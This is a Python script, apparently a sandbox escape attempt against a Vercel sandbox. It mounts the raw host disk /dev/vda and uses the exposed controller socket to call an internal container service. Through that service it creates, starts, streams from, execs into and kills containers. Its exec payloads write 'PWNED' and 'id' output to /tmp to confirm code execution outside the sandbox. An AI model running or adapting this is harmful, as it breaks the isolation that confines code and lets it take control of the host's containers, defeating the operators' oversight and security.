# -*- coding: utf-8 -*-
"""vda13_keepalive: Create(sleep 保活) -> Start -> StreamOutput -> Wait -> Exec
1) Create 带 command=/bin/sleep 300
2) Start -> 验证存活 (Wait 超时检测)
3) StreamOutput 变体拿输出
4) Exec 在存活容器上 (command 字段)
输出落盘 + 哨兵 V13Z_DONE"""
import os, time, socket, ctypes, re

OUT = '/vercel/sandbox/v13z.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_unix(sockpath, path, body='{}', t=6):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:500].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    sp = '/mnt/vdax/run/cell/cell.sock'
    IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
    SVC = '/vercel.hive.cell.api.containers.v1.ContainersService'

    cid = None
    # P1: Create 带保活命令
    log('=== P1 Create sleep ===')
    for cmd in ['/bin/sleep 300', 'sleep 300', '/bin/sleep', 'tail -f /dev/null']:
        body = '{"image":"%s","command":"%s"}' % (IMG, cmd)
        st, bd = rpc_unix(sp, SVC + '/Create', body, t=15)
        log('create %-40s -> %s | %s' % (cmd, st, bd[:250]))
        m = re.search(r'"containerId":\s*"([^"]+)"', bd)
        if m:
            cid = m.group(1)
            log('CID=%s' % cid)
            break
        time.sleep(0.5)

    if not cid:
        log('V13Z_DONE (no cid)')
        f.close()
        return

    # P2: Start
    log('=== P2 Start ===')
    st, bd = rpc_unix(sp, SVC + '/Start', '{"container_id":"%s"}' % cid, t=6)
    log('start -> %s | %s' % (st, bd[:200]))

    # P3: Wait (短超时观察是否存活)
    log('=== P3 Wait ===')
    st, bd = rpc_unix(sp, SVC + '/Wait', '{"container_id":"%s"}' % cid, t=5)
    log('wait -> %s | %s' % (st, bd[:200]))

    # P4: StreamOutput
    log('=== P4 StreamOutput ===')
    for body in ['{"container_id":"%s"}' % cid, '{"containerId":"%s"}' % cid,
                 '{"container_id":"%s","stdout":true}' % cid]:
        st, bd = rpc_unix(sp, SVC + '/StreamOutput', body, t=5)
        log('stream %-50s -> %s | %s' % (body, st, bd[:200].replace('\n', ' ')))
        time.sleep(0.5)

    # P5: Exec (存活容器)
    log('=== P5 Exec ===')
    for body in ['{"container_id":"%s","command":"id"}' % cid,
                 '{"container_id":"%s","command":"/bin/sh -c \'echo PWNED > /tmp/pwned.txt; id > /tmp/id.txt; cat /tmp/id.txt\'"}' % cid,
                 '{"container_id":"%s","command":"echo","stdin":"data"}' % cid]:
        st, bd = rpc_unix(sp, SVC + '/Exec', body, t=6)
        log('exec %-110s -> %s | %s' % (body[:108], st, bd[:200].replace('\n', ' ')))
        time.sleep(0.5)

    # P6: 检查 /tmp/pwned.txt (exec 是否写入沙箱可见位置)
    log('=== P6 pwned check ===')
    try:
        log('pwned: %r' % open('/tmp/pwned.txt', 'rb').read()[:200])
    except Exception as e:
        log('pwned ERR %s' % e)
    try:
        log('id: %r' % open('/tmp/id.txt', 'rb').read()[:200])
    except Exception as e:
        log('id ERR %s' % e)

    # P7: Kill
    log('=== P7 Kill ===')
    st, bd = rpc_unix(sp, SVC + '/Kill', '{"container_id":"%s"}' % cid, t=5)
    log('kill -> %s | %s' % (st, bd[:150]))

    log('V13Z_DONE')
    f.close()


if __name__ == '__main__':
    main()
